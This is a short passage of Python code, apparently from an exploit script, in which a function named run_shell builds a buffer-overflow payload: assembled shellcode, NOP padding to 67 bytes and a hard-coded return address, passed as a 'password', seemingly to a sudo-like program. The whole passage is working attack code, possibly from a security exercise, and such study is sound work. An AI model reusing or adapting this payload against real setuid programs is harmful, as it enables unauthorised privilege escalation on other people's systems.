...
def run_shell(path_to_sudo: str):
    ...
    """
    shellcode_bytes = bytearray(assemble.assemble_file('./shellcode.asm'))
    while len(shellcode_bytes)<67:
        shellcode_bytes.append(144) #Fill with nops
    
    shellcode_bytes.append(int.from_bytes(b'\xf9', sys.byteorder))
    shellcode_bytes.append(int.from_bytes(b'\xdf', sys.byteorder))
    shellcode_bytes.append(int.from_bytes(b'\xff', sys.byteorder))
    shellcode_bytes.append(int.from_bytes(b'\xbf', sys.byteorder))
    
    password = bytes(shellcode_bytes)
